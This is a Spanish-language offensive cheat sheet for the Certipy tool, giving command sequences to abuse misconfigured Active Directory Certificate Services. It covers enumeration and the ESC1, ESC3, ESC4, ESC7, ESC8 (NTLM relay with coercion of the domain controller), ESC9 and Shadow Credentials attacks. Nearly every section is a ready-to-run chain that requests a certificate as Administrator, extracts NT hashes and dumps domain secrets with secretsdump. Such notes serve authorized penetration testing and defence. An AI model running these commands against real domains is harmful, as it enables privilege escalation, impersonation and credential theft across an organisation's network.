## Certipy — Ataques sobre AD CS

Certipy es una herramienta ofensiva y defensiva para enumerar y abusar de **Active Directory Certificate Services (AD CS)**. Permite descubrir plantillas de certificados mal configuradas y explotarlas para escalar privilegios, impersonar usuarios y obtener acceso persistente al dominio — sin necesidad de credenciales adicionales una vez se tiene una plantilla vulnerable.

Soporta la detección y explotación de ESC1 a ESC16.

### Instalación

```shell
# Kali (recomendado — mantenerla actualizada)
sudo apt install certipy-ad

# Via pip (entorno virtual)
python3 -m venv certipy-venv
source certipy-venv/bin/activate
pip install certipy-ad

# Última versión desde el repo
pipx install -f "git+https://github.com/ly4k/Certipy.git"
```

---

## Enumeración

```shell
# Buscar plantillas vulnerables habilitadas
certipy find -u <usuario> -p <contraseña> -dc-ip <ip_dc> -target <dc> -enabled -vulnerable -stdout

# Descubrir servicios de inscripción ADCS via LDAP
nxc ldap <objetivo> -u <usuario> -p <contraseña> -M adcs

# Enumerar CAs via RPC (anónimo)
nxc smb <objetivo> -M enum_ca
```

> 💡 Certipy también genera datos para BloodHound automáticamente — el ZIP resultante se puede importar directamente para visualizar rutas de escalada via ADCS.

---

## Flujo general de explotación

Independientemente del ESC, el flujo siempre termina igual:

```shell
# 1. Solicitar el certificado (req)
certipy req -u <usuario>@<dominio> -p <contraseña> -ca <ca> -target <dc> -template <plantilla> -upn administrator -dc-ip <ip_dc>

# 2. Autenticarse con el certificado y obtener el hash NT
certipy auth -pfx administrator.pfx -domain <dominio> -u administrator -dc-ip <ip_dc>

# 3. Usar el hash para acceso completo
secretsdump.py '<dominio>/administrator'@<ip_dc> -hashes ':<hash_nt>'
```

---

## ESC1 — Plantilla permite al solicitante especificar el SAN

**Condiciones:** La plantilla tiene `ENROLLEE_SUPPLIES_SUBJECT` activado y permite autenticación de cliente. Cualquier usuario del dominio puede solicitarla.

```shell
# Solicitar certificado como Administrator
certipy req -u <usuario>@<dominio> -p <contraseña> -ca <ca> \
  -target <dominio> -template <plantilla> -upn administrator -dc-ip <ip_dc>

# Si la plantilla requiere clave RSA de 4096 bits
certipy req -u <usuario>@<dominio> -p <contraseña> -ca <ca> \
  -target <dominio> -template <plantilla> -upn administrator -dc-ip <ip_dc> -key-size 4096

# Si el DC tiene Full Enforcement mode (desde Feb 2025) — añadir el SID
certipy req -u <usuario>@<dominio> -p <contraseña> -ca <ca> \
  -target <dominio> -template <plantilla> -upn administrator -sid <sid_administrador> -dc-ip <ip_dc>

# Autenticar y obtener hash NT
certipy auth -pfx administrator.pfx -domain <dominio> -u administrator -dc-ip <ip_dc>
```

---

## ESC3 — Agente de inscripción (On Behalf Of)

**Condiciones:** Existe una plantilla de agente de inscripción y otra que permite solicitar certificados en nombre de otros usuarios.

```shell
# Paso 1 — Obtener certificado de agente de inscripción
certipy req -u <usuario>@<dominio> -p <contraseña> -ca <ca> -target <dominio> -template <plantilla_agente>

# Paso 2 — Solicitar certificado en nombre de Administrator
certipy req -u <usuario>@<dominio> -p <contraseña> -ca <ca> \
  -target <dominio> -template User -on-behalf-of administrator -pfx <cert_agente>.pfx

# Paso 3 — Autenticar
certipy auth -pfx administrator.pfx -dc-ip <ip_dc>
```

---

## ESC4 — Control de escritura sobre la plantilla

**Condiciones:** El usuario tiene permisos de escritura sobre una plantilla existente, lo que permite modificarla para hacerla vulnerable a ESC1.

```shell
# Modificar la plantilla (guarda la configuración original)
certipy template -u <usuario>@<dominio> -p <contraseña> -template <plantilla> -save-old -dc-ip <ip_dc>

# Solicitar certificado como Administrator
certipy req -u <usuario>@<dominio> -p <contraseña> -dc-ip <ip_dc> \
  -ca <ca> -target <dc> -template <plantilla> -upn administrator

# Autenticar
certipy auth -pfx administrator.pfx -domain <dominio> -u administrator -dc-ip <ip_dc>
```

---

## ESC7 — Control sobre la CA

**Condiciones:** El usuario tiene derechos de `Manage CA` o `Manage Certificates` sobre la CA.

```shell
# Añadirse como officer de la CA
certipy ca -ca <ca> -add-officer <usuario> -u <usuario>@<dominio> -p <contraseña> -dc-ip <ip_dc>

# Habilitar la plantilla SubCA
certipy ca -ca <ca> -enable-template SubCA -u <usuario>@<dominio> -p <contraseña> -dc-ip <ip_dc>

# Solicitar certificado con SubCA (será denegado pero generará una petición)
certipy req -u <usuario>@<dominio> -p <contraseña> -ca <ca> \
  -target <ip_dc> -template SubCA -upn administrator@<dominio>

# Aprobar la petición manualmente con el ID obtenido
certipy ca -ca <ca> -issue-request <id_peticion> -u <usuario>@<dominio> -p <contraseña>

# Recuperar el certificado aprobado
certipy req -u <usuario>@<dominio> -p <contraseña> -ca <ca> -target <ip_dc> -retrieve <id_peticion>

# Autenticar
certipy auth -pfx administrator.pfx -domain <dominio> -u administrator -dc-ip <ip_dc>
```

---

## ESC8 — NTLM Relay a HTTP Enrollment

**Condiciones:** El endpoint de inscripción web de la CA acepta NTLM y no tiene protección EPA/signing. Se puede coaccionar al DC para que se autentique contra nosotros.

```shell
# Levantar el relay hacia el endpoint de inscripción
ntlmrelayx.py -t http://<dominio>/certsrv/certfnsh.asp -smb2support \
  --adcs --template <plantilla> --no-http-server --no-wcf-server --no-raw-server

# Coaccionar autenticación del DC
coercer coerce -u <usuario> -p <contraseña> -l <ip_atacante> -t <ip_dc> --always-continue

# Autenticar con el certificado capturado
certipy auth -pfx administrator.pfx
```

---

## ESC9 — Sin seguridad en el mapeo de certificados (Shadow Credentials)

**Condiciones:** Se tiene `GenericWrite` sobre un usuario y la plantilla no requiere mapeo seguro.

```shell
# Obtener el hash del usuario objetivo via Shadow Credentials
certipy shadow auto -u <usuario>@<dominio> -hashes :<hash_nt> -account <usuario_objetivo>

# Actualizar el UPN del objetivo para que apunte a Administrator
certipy account update -u <usuario>@<dominio> -hashes :<hash_nt> \
  -user <usuario_objetivo> -upn administrator

# Solicitar certificado como Administrator
certipy req -u <usuario_objetivo>@<dominio> -hashes :<hash_objetivo> \
  -ca <ca> -template <plantilla> -target <ip_dc>

# Restaurar el UPN original
certipy account update -u <usuario>@<dominio> -hashes :<hash_nt> \
  -user <usuario_objetivo> -upn <usuario_objetivo>

# Autenticar
certipy auth -pfx administrator.pfx -domain <dominio>
```

---

## Shadow Credentials con Certipy

Certipy también puede realizar el ataque de Shadow Credentials directamente:

```shell
# Auto — obtiene el hash NT en un solo comando
certipy shadow auto -u <usuario_controlado>@<dominio> -p <contraseña> -account <usuario_objetivo>

# Con hash NT (Pass-the-Hash)
certipy shadow auto -u <usuario_controlado>@<dominio> -hashes :<hash_nt> -account <usuario_objetivo>
```

---

### Referencias

- https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
- https://www.thehacker.recipes/ad/movement/adcs/
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
- https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/
